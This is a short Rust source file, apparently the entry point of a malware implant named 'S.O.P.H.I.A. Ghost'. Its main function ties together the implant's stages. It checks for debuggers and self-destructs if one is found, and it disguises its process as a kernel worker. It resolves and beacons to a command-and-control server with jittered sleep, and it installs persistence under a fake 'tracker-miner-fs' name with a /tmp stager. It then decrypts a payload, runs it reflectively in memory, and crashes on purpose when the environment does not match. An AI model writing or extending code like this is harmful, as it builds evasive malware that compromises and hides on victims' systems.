mod crypto;
mod stealth;
mod comm;
mod defense;

use sophia_macros::obfuscate;
use crypto::GhostVault;
use stealth::{masquerade, setup_persistence, reflective_exec};
use comm::Oracle;
use defense::{check_ptrace, trigger_cyanide_pill, set_self_destruct};

#[obfuscate]
fn main() {
    set_self_destruct();
    if check_ptrace() {
        trigger_cyanide_pill();
    }

    let fake_name = "[kworker/u4:0]";
    masquerade(fake_name);

    let vault = GhostVault::new();
    let oracle = Oracle::new();
    let _c2_ip = oracle.resolve_c2();
    oracle.beacon();

    let sleep_time = oracle.get_jitter_sleep();
    println!("S.O.P.H.I.A. Ghost initialized. Jitter sleep: {:?}.", sleep_time);

    let _ = setup_persistence("tracker-miner-fs", "/tmp/sophia_stager");

    let dummy_ciphertext = vec![0u8; 32];
    let dummy_nonce = vec![0u8; 24];

    match vault.decrypt(&dummy_ciphertext, &dummy_nonce) {
        Ok(payload) => {
            println!("Decryption successful, environment verified.");
            let _ = reflective_exec(&payload, fake_name);
        }
        Err(_) => {
            println!("Environmental mismatch. Initiating innocent crash...");
            unsafe {
                let garbage_ptr: fn() = std::mem::transmute(0xDEADBEEF_usize);
                garbage_ptr();
            }
        }
    }
}
